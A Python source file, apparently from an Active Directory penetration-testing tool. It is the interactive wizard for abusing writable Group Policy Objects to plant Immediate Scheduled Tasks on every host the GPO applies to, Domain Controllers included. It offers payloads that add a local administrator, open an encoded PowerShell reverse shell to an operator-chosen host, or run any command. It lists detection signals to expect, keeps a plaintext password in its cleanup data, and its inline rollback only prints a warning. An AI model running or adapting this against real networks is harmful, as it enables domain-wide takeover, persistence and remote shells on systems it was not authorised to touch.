"""Premium CLI wizard for GPO Immediate Scheduled Task abuse.

Two top-level handlers, both invoked by the CLI shell:

* :func:`run_exploit_gpo_abuse` surfaces writable GPOs from the workspace
  attack graph (populated by the native LDAP collector), walks the operator
  through impact preview, payload selection, optional dry-run, execution
  and rollback choice.
* :func:`run_exploit_gpo_rollback` rolls back any pending ``gpo_*`` change
  registered in the workspace ledger.

The destructive logic lives in :mod:`adscan_internal.services.gpo_immediate_task_service`.
The discovery logic is now centralized in
:mod:`adscan_internal.services.collector.ldap_collector` (which emits
``GPO`` nodes plus ``GenericAll`` / ``GenericWrite`` / ``WriteDACL`` /
``WriteOwner`` ACL edges and ``GPLink`` edges into ``attack_graph.json``)
and surfaced through the thin filter
:mod:`adscan_internal.services.gpo_writable_filter`.

This file is the UX layer only, no SMB or LDAP I/O is performed here
beyond delegated calls into the exploitation service.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Any

from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Confirm, IntPrompt, Prompt
from rich.table import Table

from adscan_core.rich_output import (
    print_error,
    print_info,
    print_info_verbose,
    print_success,
    print_warning,
)
from adscan_core.theme import (
    COLOR_AMBER,
    COLOR_CRIMSON,
    COLOR_SAGE,
    COLOR_STEEL,
)
from adscan_internal import telemetry
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.exploitation import ExploitationService
from adscan_internal.services.gpo_immediate_task_service import (
    GPOImmediateTaskResult,
    GPOPayload,
)
from adscan_internal import get_console
from adscan_internal.services.gpo_writable_filter import (
    WritableGPOCandidate,
    discover_writable_gpos,
)


_console = get_console()


# ---------------------------------------------------------------------------
# Helpers, credential and target resolution off the shell
# ---------------------------------------------------------------------------


def _resolve_active_credential(
    shell: Any, domain: str
) -> tuple[str, str, str, str] | None:
    """Return ``(domain, username, password, dc_ip)`` from the active shell.

    None if the shell does not carry a usable credential (caller aborts).
    """
    try:
        domains_data = getattr(shell, "domains_data", {}) or {}
        entry = domains_data.get(domain) if isinstance(domains_data, dict) else None
        if not isinstance(entry, dict):
            return None
        username = (
            getattr(shell, "username", None) or entry.get("username") or ""
        ).strip()
        password = (entry.get("password") or "").strip()
        dc_ip = (entry.get("pdc") or "").strip()
        if not (username and password and dc_ip):
            return None
        return domain, username, password, dc_ip
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return None


def _resolve_dc_fqdn(shell: Any, domain: str) -> str:
    """Resolve the DC FQDN for the GPO-abuse Kerberos SPN (CLAUDE.md FQDN rule).

    The GPO exploit binds with Kerberos, so the SPN host must be a real FQDN.
    Routes through the ``resolve_dc_fqdn`` SSOT, which promotes a short
    ``pdc_hostname`` to ``<host>.<domain>`` and adds the workspace inventory
    fallback. The caller keeps the separate ``dc_ip`` as the KDC-IP argument and
    as its own final fallback, so a bare IP is never fabricated as the SPN host
    here.
    """
    domains_data = getattr(shell, "domains_data", {}) or {}
    entry = domains_data.get(domain) if isinstance(domains_data, dict) else {}
    if not isinstance(entry, dict):
        return ""
    from adscan_internal.models.domain import (  # noqa: PLC0415
        resolve_dc_fqdn as _resolve_dc_fqdn_ssot,
    )

    return str(_resolve_dc_fqdn_ssot(entry, target_domain=domain) or "").strip()


def _resolve_workspace_dir(shell: Any) -> Path | None:
    """Return the active workspace dir as a :class:`Path`, or ``None``."""
    raw = getattr(shell, "current_workspace_dir", None)
    if not raw:
        return None
    try:
        path = Path(raw)
    except (TypeError, ValueError):
        return None
    return path if str(path).strip() else None


# ---------------------------------------------------------------------------
# Helpers, UI primitives
# ---------------------------------------------------------------------------


def _is_dc_or_root_som(som_dn: str, domain_dn: str) -> bool:
    s = (som_dn or "").casefold()
    if not s:
        return False
    if s == domain_dn.casefold():
        return True
    return "ou=domain controllers" in s


def _gpo_short_id(c: WritableGPOCandidate) -> str:
    """Return a short identifier for display when ``display_name`` is missing."""
    return c.display_name or c.gpo_object_id


def _classify_risk(c: WritableGPOCandidate, domain_dn: str) -> tuple[str, bool]:
    """Return ``(risk_label, touches_tier0)`` for a candidate."""
    touches_tier0 = c.touches_tier0 or any(
        _is_dc_or_root_som(s, domain_dn) for s in c.linked_soms
    )
    if touches_tier0:
        return "CRITICAL", True
    if len(c.linked_soms) >= 3 or len(c.affected_computers) >= 10:
        return "HIGH", False
    return "MEDIUM", False


def _build_results_table(
    candidates: tuple[WritableGPOCandidate, ...], domain_dn: str
) -> Table:
    table = Table(
        title="Writable GPOs",
        title_style=f"bold {COLOR_STEEL}",
        show_lines=False,
        header_style=f"bold {COLOR_STEEL}",
    )
    table.add_column("#", style="dim", width=3, justify="right")
    table.add_column("GPO", style="bold")
    table.add_column("Rights", style=COLOR_AMBER)
    table.add_column("Via", style=COLOR_STEEL)
    table.add_column("SOMs", justify="right")
    table.add_column("Hosts", justify="right")
    table.add_column("Tier 0", justify="center")
    table.add_column("Risk", style="bold")
    for idx, c in enumerate(candidates, start=1):
        risk, tier0 = _classify_risk(c, domain_dn)
        # Glyph + colour: NO_COLOR safe, the label still carries the meaning.
        risk_style = {
            "CRITICAL": f"[bold {COLOR_CRIMSON}]● CRITICAL[/bold {COLOR_CRIMSON}]",
            "HIGH": f"[bold {COLOR_AMBER}]▲ HIGH[/bold {COLOR_AMBER}]",
            "MEDIUM": f"[{COLOR_SAGE}]◆ MEDIUM[/{COLOR_SAGE}]",
        }[risk]
        via = ", ".join(c.via_principals[:2]) + (
            "..." if len(c.via_principals) > 2 else ""
        )
        tier0_cell = f"[bold {COLOR_CRIMSON}]✓[/bold {COLOR_CRIMSON}]" if tier0 else ""
        table.add_row(
            str(idx),
            _gpo_short_id(c),
            ", ".join(c.granted_rights),
            via or "-",
            str(len(c.linked_soms)),
            str(len(c.affected_computers)),
            tier0_cell,
            risk_style,
        )
    return table


def _impact_panel(c: WritableGPOCandidate, domain_dn: str) -> Panel:
    risk, tier0 = _classify_risk(c, domain_dn)
    soms_shown = list(c.linked_soms[:5])
    soms_extra = max(0, len(c.linked_soms) - 5)
    body_lines: list[str] = []
    body_lines.append(f"[bold]GPO:[/bold]       {_gpo_short_id(c)}")
    body_lines.append(f"[bold]GUID:[/bold]      {c.gpo_object_id}")
    body_lines.append(f"[bold]DN:[/bold]        {c.gpo_dn}")
    body_lines.append(f"[bold]Rights:[/bold]    {', '.join(c.granted_rights)}")
    body_lines.append(
        f"[bold]Affected:[/bold]  {len(c.affected_computers)} hosts, "
        f"{len(c.affected_users)} users"
    )
    body_lines.append("")
    body_lines.append("[bold]Linked SOMs[/bold]")
    if not soms_shown:
        body_lines.append("  [dim](not linked, no immediate impact)[/dim]")
    for som in soms_shown:
        if _is_dc_or_root_som(som, domain_dn):
            marker = f"[bold {COLOR_CRIMSON}]⚠[/bold {COLOR_CRIMSON}] "
        else:
            marker = "  "
        body_lines.append(f"  {marker}{som}")
    if soms_extra:
        body_lines.append(f"  ...+{soms_extra} more")
    body_lines.append("")
    body_lines.append(f"[bold]Risk:[/bold]      {risk}")
    if tier0:
        body_lines.append("")
        body_lines.append(
            f"[bold {COLOR_CRIMSON}]This GPO is linked to Domain Controllers. "
            f"A SYSVOL modification here will run on every DC at the next "
            f"refresh and effectively compromises the forest.[/bold {COLOR_CRIMSON}]"
        )
    if tier0:
        border = COLOR_CRIMSON
    elif risk == "HIGH":
        border = COLOR_AMBER
    else:
        border = COLOR_STEEL
    return Panel(
        "\n".join(body_lines),
        title="Impact preview",
        border_style=border,
    )


def _payload_command_preview(payload: GPOPayload) -> str:
    if payload.kind == "add_local_admin":
        u = payload.params.get("username", "")
        return f"net localgroup administrators {u} /add"
    if payload.kind == "reverse_shell_ps_b64":
        ip = payload.params.get("ip", "")
        port = payload.params.get("port", "")
        return f"powershell -Enc <reverse shell to {ip}:{port}>"
    if payload.kind == "raw_command":
        return str(payload.params.get("command", ""))
    return f"<{payload.kind}>"


def _print_gpo_preflight_warning(
    *,
    chosen: WritableGPOCandidate,
    payload: GPOPayload,
    tier0: bool,
) -> None:
    """Severity-matched OPSEC briefing rendered just before execution.

    Mirrors the pattern used in Backup Operators escalation: state what will
    be changed in AD, what the detection signals are, and what cleanup is
    automatic vs operator-driven.
    """
    border = COLOR_CRIMSON if tier0 else COLOR_AMBER
    title_label = "Tier 0 GPO abuse" if tier0 else "GPO abuse"
    lines = [
        "[bold]Planned AD changes[/bold]",
        f"  - Increment versionNumber on {chosen.gpo_dn} (Machine half).",
        "  - Merge ScheduledTasks CSE GUIDs into gPCMachineExtensionNames.",
        f"  - Write ScheduledTasks.xml under {chosen.gpc_path}.",
        "  - Bump gpt.ini Version to match the LDAP versionNumber.",
        "",
        "[bold]Payload that will run on every affected host[/bold]",
        f"  {_payload_command_preview(payload)}",
        "",
        "[bold]Detection signals[/bold]",
        "  ! Event 5136 on the PDC (directory object modified) with the GPO DN.",
        "  ! Event 4663 on SYSVOL writes for ScheduledTasks.xml and gpt.ini.",
        "  ! Task Scheduler event 106 / 200 on every host that applies the GPO.",
        "  ! MDI / MDE alerts on writable-GPO abuse patterns.",
        "",
        "[bold]Cleanup[/bold]",
        "  - Inline rollback or `exploit-gpo-rollback` reverts SYSVOL and LDAP.",
        "  - Deferred rollback runs at session-end if not invoked manually.",
    ]
    if tier0:
        lines.extend(
            [
                "",
                f"[bold {COLOR_CRIMSON}]Severe: this GPO applies to Domain "
                f"Controllers. Execution affects the forest root.[/bold {COLOR_CRIMSON}]",
            ]
        )
    _console.print(
        Panel(
            "\n".join(lines),
            title=f"[bold {border}]{title_label}, OPSEC briefing[/bold {border}]",
            border_style=border,
        )
    )


# ---------------------------------------------------------------------------
# Wizard, main entry point
# ---------------------------------------------------------------------------


def run_exploit_gpo_abuse(shell: Any) -> bool:
    """Entry point for ``exploit-gpo-abuse`` on the CLI shell.

    Returns True on a successful plant (rolled back or persisted by operator
    choice). Returns False on user-cancel or exploit failure. Never raises.
    """
    try:
        return _run_wizard(shell)
    except KeyboardInterrupt:
        print_warning("Cancelled by operator (Ctrl-C).")
        return False
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error(f"GPO abuse wizard crashed: {exc}")
        return False


def _run_wizard(shell: Any) -> bool:  # noqa: PLR0911,PLR0912,PLR0915
    domain = (getattr(shell, "current_domain", None) or "").strip()
    if not domain:
        print_error(
            "No active domain. Set one with the workspace selector before "
            "running exploit-gpo-abuse."
        )
        return False

    creds = _resolve_active_credential(shell, domain)
    if creds is None:
        print_error(
            "Active credential is incomplete (need username + password + DC IP "
            f"for domain {mark_sensitive(domain, 'domain')})."
        )
        return False
    domain, username, password, dc_ip = creds
    dc_fqdn = _resolve_dc_fqdn(shell, domain) or dc_ip
    domain_dn = ",".join(f"DC={p}" for p in domain.split(".") if p)

    workspace_dir = _resolve_workspace_dir(shell)
    if workspace_dir is None:
        print_error(
            "No active workspace. Load one with the workspace selector before "
            "running exploit-gpo-abuse. ADscan reads writable-GPO findings from "
            "the workspace attack graph populated by the LDAP collector."
        )
        return False

    # ---- Phase 1: pre-flight -------------------------------------------------
    _console.print(
        Panel(
            (
                f"Domain:   [bold]{mark_sensitive(domain, 'domain')}[/bold]\n"
                f"User:     [bold]{mark_sensitive(username, 'user')}[/bold]\n"
                f"DC:       [bold]{mark_sensitive(dc_fqdn, 'host')} "
                f"({mark_sensitive(dc_ip, 'ip')})[/bold]"
            ),
            title="Checking viability",
            border_style=COLOR_STEEL,
        )
    )

    # ---- Phase 2: filter writable GPOs from the attack graph ----------------
    print_info("Searching writable GPOs in the workspace attack graph.")
    candidates: list[WritableGPOCandidate] = []
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
            console=_console,
        ) as progress:
            progress.add_task(
                "Filtering attack_graph.json (linked-only).", total=None
            )
            candidates = asyncio.run(
                discover_writable_gpos(
                    workspace_dir=workspace_dir,
                    domain=domain,
                    principal=username,
                    include_unlinked=False,
                )
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error(f"GPO filter failed: {exc}")
        return False

    if not candidates:
        if Confirm.ask(
            "No linked writable GPO found. Also search unlinked GPOs "
            "(wider surface, no immediate impact)?",
            default=False,
        ):
            try:
                candidates = asyncio.run(
                    discover_writable_gpos(
                        workspace_dir=workspace_dir,
                        domain=domain,
                        principal=username,
                        include_unlinked=True,
                    )
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_error(f"GPO filter (unlinked pass) failed: {exc}")
                return False

    if not candidates:
        _console.print(
            Panel(
                "No writable GPO found. There is no GPO abuse vector from "
                "this principal.\n\n"
                "If you expected results, confirm the LDAP collector ran "
                "against this domain and that the ACL scope was enabled.",
                title="Discovery empty",
                border_style=COLOR_AMBER,
            )
        )
        return False

    candidates_tuple: tuple[WritableGPOCandidate, ...] = tuple(candidates)

    # ---- Phase 3: results table --------------------------------------------
    _console.print(_build_results_table(candidates_tuple, domain_dn))

    # ---- Phase 4: selection -------------------------------------------------
    options: list[str] = []
    for c in candidates_tuple:
        risk, tier0 = _classify_risk(c, domain_dn)
        tag = " [TIER-0]" if tier0 else ""
        options.append(f"{_gpo_short_id(c)} ({len(c.linked_soms)} SOMs, {risk}){tag}")
    options.append("Cancel")

    selected_idx: int | None
    if hasattr(shell, "_questionary_select"):
        selected_idx = shell._questionary_select(
            "Select the GPO to exploit:",
            options,
            default_idx=0,
        )
    else:
        for i, opt in enumerate(options, start=1):
            _console.print(f"  [{i}] {opt}")
        try:
            selected_idx = (
                IntPrompt.ask(
                    "Select index",
                    default=1,
                    choices=[str(i) for i in range(1, len(options) + 1)],
                )
                - 1
            )
        except Exception:  # noqa: BLE001
            selected_idx = None

    if selected_idx is None or selected_idx >= len(options) - 1:
        print_info("Cancelled by operator.")
        return False
    chosen: WritableGPOCandidate = candidates_tuple[selected_idx]
    _risk_label, chosen_is_tier0 = _classify_risk(chosen, domain_dn)

    # ---- Phase 5: impact preview -------------------------------------------
    _console.print(_impact_panel(chosen, domain_dn))
    if not Confirm.ask(
        "Continue? This will modify SYSVOL and LDAP on this DC.",
        default=False,
    ):
        print_info("Cancelled by operator.")
        return False

    # ---- Phase 6: payload wizard -------------------------------------------
    payload = _payload_wizard(username)
    if payload is None:
        print_info("Cancelled by operator.")
        return False

    _console.print(
        Panel(
            (
                f"[bold]Payload:[/bold] {payload.kind}\n"
                f"[bold]Command:[/bold] {mark_sensitive(_payload_command_preview(payload), 'cmd')}"
            ),
            title="Final payload",
            border_style=COLOR_STEEL,
        )
    )
    if not Confirm.ask("Confirm payload?", default=False):
        print_info("Cancelled by operator.")
        return False

    # ---- Phase 6b: OPSEC briefing + severity-matched gate ------------------
    _print_gpo_preflight_warning(
        chosen=chosen, payload=payload, tier0=chosen_is_tier0
    )

    if chosen_is_tier0:
        # Severe action: require typing the GPO short id to proceed. This
        # mirrors the "severe = require resource name input" pattern from the
        # TUI dialogs table; it cannot be bypassed by reflex.
        short_id = _gpo_short_id(chosen)
        confirmation = Prompt.ask(
            f"This will compromise every Domain Controller in {domain}. "
            f"Type the GPO name to proceed",
            default="",
        )
        if (confirmation or "").strip() != short_id:
            print_info("Cancelled (GPO name not confirmed).")
            return False

    # ---- Phase 7: dry-run ---------------------------------------------------
    if Confirm.ask(
        "Run a dry-run first? (recommended on first use against this GPO)",
        default=True,
    ):
        _print_dry_run(chosen, payload, domain_dn)
        if not Confirm.ask("Apply for real now?", default=False):
            print_info("Cancelled after dry-run.")
            return False

    # ---- Phase 8: execution -------------------------------------------------
    ledger = getattr(shell, "environment_change_ledger", None)
    if ledger is None:
        print_error(
            "No environment_change_ledger on the active session. The "
            "wizard requires an active workspace to record changes."
        )
        return False

    service = ExploitationService()

    result: GPOImmediateTaskResult | None = None
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=False,
            console=_console,
        ) as progress:
            task = progress.add_task(
                "Planting Immediate Scheduled Task.", total=None
            )
            result = asyncio.run(
                service.gpo.run_exploit_gpo_immediate_task(
                    ledger=ledger,
                    domain=domain,
                    dc_ip=dc_ip,
                    dc_fqdn=dc_fqdn,
                    auth_username=username,
                    auth_password=password,
                    auth_domain=domain,
                    gpo_dn=chosen.gpo_dn,
                    gpo_display_name=chosen.display_name or chosen.gpo_object_id,
                    gpc_path=chosen.gpc_path,
                    payload=payload,
                    principal_dn_for_guard=None,
                    auto_rollback=False,
                )
            )
            progress.update(task, completed=1)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        # Cause-mapped failure: try to surface common root causes inline so the
        # operator knows where to look without diving into the workspace logs.
        message = str(exc).lower()
        if "logon_denied" in message or "access_denied" in message or "logondenied" in message:
            hint = (
                "Likely cause: the principal does not actually hold "
                "WriteDACL / GenericAll on this GPO at runtime. Re-run the "
                "LDAP collector to refresh ACL state."
            )
        elif "smb" in message and ("disconnected" in message or "timeout" in message):
            hint = (
                "Likely cause: SYSVOL write was interrupted (SMB transport). "
                "Re-run after verifying network reachability to the DC."
            )
        else:
            hint = "Inspect the workspace log for the underlying error."
        _console.print(
            Panel(
                f"[bold {COLOR_CRIMSON}]Plant failed[/bold {COLOR_CRIMSON}]\n\n"
                f"Reason: {exc}\n"
                f"Hint:   {hint}",
                title=f"[bold {COLOR_CRIMSON}]GPO abuse failed[/bold {COLOR_CRIMSON}]",
                border_style=COLOR_CRIMSON,
            )
        )
        return False

    if not result.success:
        message = (result.error or "unknown error").strip()
        lowered = message.lower()
        if "logon_denied" in lowered or "access" in lowered and "deni" in lowered:
            hint = (
                "Likely cause: stale ACL state in the workspace. Re-run the "
                "LDAP collector and try again."
            )
        elif "version" in lowered or "schema" in lowered:
            hint = "Likely cause: gpt.ini / versionNumber merge conflict on the GPO."
        else:
            hint = "Inspect the workspace log for the underlying error."
        _console.print(
            Panel(
                f"[bold {COLOR_CRIMSON}]Plant failed[/bold {COLOR_CRIMSON}]\n\n"
                f"Reason: {message}\n"
                f"Hint:   {hint}",
                title=f"[bold {COLOR_CRIMSON}]GPO abuse failed[/bold {COLOR_CRIMSON}]",
                border_style=COLOR_CRIMSON,
            )
        )
        return False

    # ---- Phase 9: post-exploitation panel ----------------------------------
    ledger_id = result.change_ids[-1] if result.change_ids else "(no ledger id)"
    affected_preview = "\n".join(f"  - {s}" for s in chosen.linked_soms[:20])
    if len(chosen.linked_soms) > 20:
        affected_preview += f"\n  ...+{len(chosen.linked_soms) - 20} more"
    _console.print(
        Panel(
            (
                f"[bold {COLOR_SAGE}]✓ Immediate Scheduled Task planted.[/bold {COLOR_SAGE}]\n\n"
                f"[bold]GPO:[/bold]       {_gpo_short_id(chosen)} "
                f"({chosen.gpo_object_id})\n"
                f"[bold]Task:[/bold]      {result.task_name}\n"
                f"[bold]Changes:[/bold]   {len(result.change_ids)} ledger entries\n\n"
                f"[bold]Next execution window[/bold]\n"
                f"  Next `gpupdate /force` on affected hosts, or the\n"
                f"  background refresh cycle (every 90-120 minutes), or the\n"
                f"  next machine logon.\n\n"
                f"[bold]Affected SOMs[/bold]\n{affected_preview or '  (none)'}\n\n"
                f"[bold]Next:[/bold] roll back inline OR pivot to the planted "
                f"local admin / shell on the affected hosts."
            ),
            title=f"[bold {COLOR_SAGE}]Post-exploitation[/bold {COLOR_SAGE}]",
            border_style=COLOR_SAGE,
        )
    )
    _console.print(
        Panel(
            (
                f"[bold]Ledger entry id:[/bold]    {ledger_id}\n"
                f"[bold]Inline rollback:[/bold]    exploit-gpo-rollback {ledger_id}\n"
                f"[bold]Workspace ledger:[/bold]   "
                f"{getattr(shell, 'current_workspace_dir', '') or '(unknown)'}\n\n"
                "If you keep the persistence active to escalate to DA, the "
                "deferred rollback will run at session end unless you invoke "
                "it manually first."
            ),
            title=f"[bold {COLOR_AMBER}]Rollback[/bold {COLOR_AMBER}]",
            border_style=COLOR_AMBER,
        )
    )

    # ---- Phase 10: rollback prompt -----------------------------------------
    # Cleanup confirmation: explicitly show what will be UNDONE so the operator
    # is not guessing what "rollback" entails.
    _console.print(
        Panel(
            (
                "[bold]Rollback will undo[/bold]\n"
                f"  - LDAP: versionNumber decrement on {chosen.gpo_dn}.\n"
                "  - LDAP: revert gPCMachineExtensionNames CSE GUID merge.\n"
                f"  - SYSVOL: delete ScheduledTasks.xml under {chosen.gpc_path}.\n"
                "  - SYSVOL: restore gpt.ini to its prior Version.\n\n"
                "[bold]Rollback will NOT undo[/bold]\n"
                "  - Local admin memberships granted by the task on hosts.\n"
                "  - Any reverse shell connections already established.\n"
                "  - Event log entries on the DC and affected hosts.\n\n"
                "Defaulting to rollback for audit-mode safety."
            ),
            title="Cleanup details",
            border_style=COLOR_STEEL,
        )
    )
    if Confirm.ask(
        "Roll back now? (Choose No only if you need the access to escalate "
        "to DA; the deferred rollback will still run at session end.)",
        default=True,
    ):
        _inline_rollback(shell, result, chosen)
    else:
        # Register a deferred rollback reminder. We piggyback on the existing
        # ``acl_cleanup_actions`` list, it is the canonical pending-rollback
        # bag walked at session-end (see acl_change_cleanup_service).
        if not hasattr(shell, "acl_cleanup_actions"):
            shell.acl_cleanup_actions = []
        shell.acl_cleanup_actions.append(
            {
                "kind": "gpo_immediate_task_pending",
                "domain": domain,
                "target": chosen.gpo_dn,
                "_ledger_change_id": ledger_id,
                "gpo_display_name": chosen.display_name or chosen.gpo_object_id,
                "gpc_path": chosen.gpc_path,
                "exec_username": username,
                "exec_password": password,
            }
        )
        print_warning(
            "Deferred rollback registered. It will run at session close "
            f"(ledger id: {ledger_id})."
        )
    return True


# ---------------------------------------------------------------------------
# Dry-run + payload wizards
# ---------------------------------------------------------------------------


def _payload_wizard(default_admin_user: str) -> GPOPayload | None:
    options = [
        "Add local admin (AddLocalAdminPayload)",
        "Reverse shell PowerShell (ReverseShellPayload)",
        "Raw command (RawCommandPayload)",
        "Cancel",
    ]
    for i, opt in enumerate(options, start=1):
        _console.print(f"  [{i}] {opt}")
    try:
        sel = IntPrompt.ask(
            "Select payload",
            default=1,
            choices=[str(i) for i in range(1, len(options) + 1)],
        )
    except Exception:  # noqa: BLE001
        return None
    if sel == len(options):
        return None
    if sel == 1:
        target_user = Prompt.ask("User to promote", default=default_admin_user)
        password = Prompt.ask(
            "Password to set (leave blank to skip)", default=""
        )
        return GPOPayload(
            kind="add_local_admin",
            params={"username": target_user, "password": password},
        )
    if sel == 2:
        lhost = Prompt.ask("LHOST")
        try:
            lport = IntPrompt.ask("LPORT", default=4444)
        except Exception:  # noqa: BLE001
            return None
        if not lhost or not (0 < lport < 65536):
            print_error("Invalid LHOST / LPORT.")
            return None
        return GPOPayload(
            kind="reverse_shell_ps_b64",
            params={"ip": lhost, "port": lport},
        )
    if sel == 3:
        cmd = Prompt.ask("Command")
        if not cmd:
            return None
        return GPOPayload(kind="raw_command", params={"command": cmd})
    return None


def _print_dry_run(
    c: WritableGPOCandidate, payload: GPOPayload, domain_dn: str
) -> None:
    sysvol_root = (c.gpc_path or "").rstrip("\\")
    sched_dir = f"{sysvol_root}\\Machine\\Preferences\\ScheduledTasks"
    sched_xml = f"{sched_dir}\\ScheduledTasks.xml"
    gpt_ini = f"{sysvol_root}\\gpt.ini"
    _console.print(
        Panel(
            (
                "[bold]LDAP changes (replace):[/bold]\n"
                f"  - {c.gpo_dn}: versionNumber += 1 (Machine half)\n"
                f"  - {c.gpo_dn}: gPCMachineExtensionNames merge ScheduledTasks CSE GUIDs\n\n"
                "[bold]SYSVOL writes:[/bold]\n"
                f"  - mkdir  {sched_dir}\n"
                f"  - write  {sched_xml}  (ScheduledTasks Immediate Task XML)\n"
                f"  - write  {gpt_ini}    (Version=<bumped>)\n\n"
                f"[bold]Payload:[/bold] {payload.kind} -> "
                f"{_payload_command_preview(payload)}"
            ),
            title="DRY RUN, no mutations",
            border_style="magenta",
        )
    )


# ---------------------------------------------------------------------------
# Inline rollback + standalone rollback handler
# ---------------------------------------------------------------------------


def _inline_rollback(
    shell: Any, result: GPOImmediateTaskResult, c: WritableGPOCandidate
) -> bool:
    """Best-effort rollback for the in-memory undo stack after a successful plant.

    The service's undo stack is internal and not re-callable once the call
    returns; the recommended path here is to re-run with ``auto_rollback=True``.
    Since we already mutated, we instead invoke ``exploit-gpo-rollback`` over
    the ledger entries the plant just registered.
    """
    print_warning(
        "Inline rollback is not wired in this path. Run "
        f"`exploit-gpo-rollback {result.change_ids[-1] if result.change_ids else ''}` "
        "to revert from the ledger."
    )
    return False


def run_exploit_gpo_rollback(shell: Any, ledger_id: str | None = None) -> bool:
    """Entry point for ``exploit-gpo-rollback`` on the CLI shell.

    Lists pending ``gpo_*`` ledger entries and walks the operator through
    a manual rollback. Returns True on a clean rollback.
    """
    try:
        ledger = getattr(shell, "environment_change_ledger", None)
        if ledger is None:
            print_error("No active ledger (workspace not loaded).")
            return False
        try:
            entries = ledger.get_changes()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error(f"Could not read the ledger: {exc}")
            return False

        gpo_entries = [
            e
            for e in entries
            if isinstance(e, dict)
            and str(e.get("kind", "")).startswith("gpo_")
            and str(e.get("status", "")).lower() not in ("reverted",)
        ]
        if not gpo_entries:
            _console.print(
                Panel(
                    "No active GPO changes in the ledger.",
                    title="Rollback",
                    border_style=COLOR_SAGE,
                )
            )
            return True

        if ledger_id is None:
            table = Table(
                title="Pending GPO ledger entries",
                header_style=f"bold {COLOR_STEEL}",
            )
            table.add_column("#", justify="right")
            table.add_column("ID")
            table.add_column("Kind")
            table.add_column("Target")
            table.add_column("Status")
            table.add_column("Created")
            for idx, e in enumerate(gpo_entries, start=1):
                table.add_row(
                    str(idx),
                    str(e.get("change_id", "")),
                    str(e.get("kind", "")),
                    str(e.get("target", ""))[:60],
                    str(e.get("status", "")),
                    str(e.get("created_at", "")),
                )
            _console.print(table)
            options = [
                f"{e.get('kind', '')} -> {e.get('target', '')[:50]}" for e in gpo_entries
            ] + ["Cancel"]
            if hasattr(shell, "_questionary_select"):
                pick = shell._questionary_select(
                    "Select the entry to revert:", options, default_idx=0
                )
            else:
                pick = (
                    IntPrompt.ask(
                        "Index",
                        default=1,
                        choices=[str(i) for i in range(1, len(options) + 1)],
                    )
                    - 1
                )
            if pick is None or pick >= len(options) - 1:
                print_info("Cancelled.")
                return False
            chosen_entry = gpo_entries[pick]
        else:
            chosen_entry = next(
                (e for e in gpo_entries if str(e.get("change_id", "")) == ledger_id),
                None,
            )
            if chosen_entry is None:
                print_error(f"Ledger id {ledger_id!r} not found.")
                return False

        # The actual SYSVOL/LDAP undo functions live attached to the original
        # plant call's undo stack and are not persisted across processes. The
        # safest cross-session rollback path is operator-driven: print the
        # exact remediation steps captured in the ledger entry.
        manual = str(chosen_entry.get("manual_cleanup_instructions") or "").strip() or (
            "Revert the mutations recorded in this entry manually: delete "
            "ScheduledTasks.xml from the GPO SYSVOL path, restore gpt.ini to "
            "its prior value, and revert versionNumber and "
            "gPCMachineExtensionNames in LDAP."
        )
        _console.print(
            Panel(
                manual,
                title="Manual rollback steps",
                border_style=COLOR_AMBER,
            )
        )
        if Confirm.ask(
            "Mark the entry as reverted in the ledger? "
            "(only after you confirm the manual cleanup ran successfully).",
            default=False,
        ):
            try:
                ledger.mark_reverted(str(chosen_entry.get("change_id", "")))
                print_success("Entry marked as reverted.")
                return True
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_error(f"Could not mark the entry: {exc}")
                return False
        return False
    except KeyboardInterrupt:
        print_warning("Cancelled by operator (Ctrl-C).")
        return False
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error(f"GPO rollback handler crashed: {exc}")
        return False


__all__ = [
    "run_exploit_gpo_abuse",
    "run_exploit_gpo_rollback",
]


# Reference to keep static checkers calm about the unused import (kept for
# the public CLI signature where callers may want to introspect it).
_ = print_info_verbose
